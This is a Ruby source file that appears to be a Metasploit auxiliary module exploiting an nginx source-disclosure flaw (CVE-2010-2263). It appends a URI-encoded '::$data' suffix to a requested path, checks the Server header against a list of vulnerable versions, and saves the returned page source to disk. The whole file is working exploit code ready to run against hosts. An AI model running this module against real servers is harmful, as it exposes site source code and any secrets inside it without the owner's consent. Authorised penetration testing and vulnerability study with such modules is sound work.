##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner


	def initialize

		super(
			'Name'           => 'Nginx Source Code Disclosure/Download',
			'Version'        => '$Revision$',
			'Description'    => 'This module exploits a nginx source code disclosure/download vulnerability.',
			'References'     =>
			[
				['BID', '40760'],
				['CVE', '2010-2263'],
			],
			'Author'         =>
			[
				'Alligator Security Team',
				'Tiago Ferreira <tiago.ccna[at]gmail.com>',
			],
			'License'        =>  MSF_LICENSE
		)

		register_options([
						 Opt::RPORT(80),
						 OptString.new('URI', [true, 'Specify the path to download the file (ex: admin.php)', '/admin.php']),
						 OptString.new('PATH_SAVE', [true, 'The path to save the downloaded source code', '']),
		], self.class)

	end

	def target_url
		"http://#{vhost}:#{rport}#{datastore['URI']}"
	end

	def run_host(ip)
		uri = datastore['URI']
		path_save = datastore['PATH_SAVE']

		vuln_versions = [ 
			"nginx/0.7.56","nginx/0.7.58","nginx/0.7.59",
			"nginx/0.7.60","nginx/0.7.61","nginx/0.7.62",
			"nginx/0.7.63","nginx/0.7.64","nginx/0.7.65",
			"nginx/0.8.33","nginx/0.8.34","nginx/0.8.35",
			"nginx/0.8.36","nginx/0.8.37","nginx/0.8.38",	
			"nginx/0.8.39","nginx/0.8.40"
		]

		get_source = Rex::Text.uri_encode("::$data")

		begin
			res = send_request_raw({
				'method'  => 'GET',
				'uri'     => "/#{uri}#{get_source}",
			}, 25)

			version = res.headers['Server'] if res

			if vuln_versions.include?(version)	
				print_good("#{target_url} - nginx - Vulnerable version: #{version}")

				if (res and res.code == 200)

					print_good("#{target_url} - nginx - Getting the source of page #{uri}")				

					save_source = File.new("#{path_save}#{uri}","w")
					save_source.puts(res.body.to_s)
					save_source.close

					print_status("#{target_url} - nginx - File successfully saved: #{path_save}#{uri}")	if (File.exists?("#{path_save}#{uri}"))

				else
					print_error("http://#{vhost}:#{rport} - nginx - Unrecognized #{res.code} response")
					return

				end

			else
				if version =~ /nginx/
					print_error("#{target_url} - nginx - Cannot exploit: the remote server is not vulnerable - Version #{version}")			
				else
					print_error("#{target_url} - nginx - Cannot exploit: the remote server is not ngnix")			
				end
				return

			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		end
	end

end

